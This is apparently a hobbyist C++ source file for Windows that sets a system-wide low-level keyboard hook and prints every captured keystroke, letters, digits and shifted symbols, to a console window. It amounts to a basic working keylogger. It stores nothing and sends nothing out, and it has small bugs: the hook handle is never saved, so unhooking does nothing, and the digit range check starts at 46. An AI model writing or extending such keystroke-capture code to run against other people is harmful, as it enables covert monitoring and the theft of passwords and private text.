#include <iostream>
#include "Windows.h"

using namespace std;

HHOOK hook;

LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT kbdStruct;
    if (nCode >= 0) {
        if(wParam == WM_KEYDOWN) {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            char c = kbdStruct.vkCode;
//            cout << kbdStruct.vkCode << endl;
//            if(kbdStruct.vkCode == VK_F8) {
//                MessageBox(nullptr, "F8 pressed", "Key pressed", MB_ICONEXCLAMATION);
//            }
            // carriage return (enter)
            if (c == 13) {
                cout << endl;
            }

            // a - z
            if (c >= 65 && c <= 90) {
                if(GetAsyncKeyState(VK_SHIFT)) {
                    cout << c;
                } else {
                    cout << (char)(c +32);
                }
            }
            // 0 - 9
            if (c >= 46 && c<= 57) {
                if(GetAsyncKeyState(VK_SHIFT)) {
                    char shiftChar;
                    switch (c) {
                        case 48:
                            cout << "=";
                            break;
                        case 49:
                            cout << "!";
                            break;
                        case 50:
                            cout << "\"";
                            break;
                        case 51:
                            cout << "#";
                            break;
                        case 52:
                            cout << "¤";
                            break;
                        case 53:
                            cout << "%";
                            break;
                        case 54:
                            cout << "&";
                            break;
                        case 55:
                            cout << "/";
                            break;
                        case 56:
                            cout << "(";
                            break;
                        case 57:
                            cout << ")";
                            break;
                    }
                } else {
                    cout << c << endl;
                }
            }
        }
    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}

void setHook() {
    if(!SetWindowsHookEx(WH_KEYBOARD_LL, hookCallback, nullptr, 0)) {
        MessageBox(nullptr, "Failed to install keyboard hook!", "Error", MB_ICONERROR);
    }
}

void releaseHook() {
    UnhookWindowsHookEx(hook);
}

int main() {
    setHook();
    MSG msg;

    while(GetMessage(&msg, nullptr, 0, 0)) {

    }

    return 0;
}
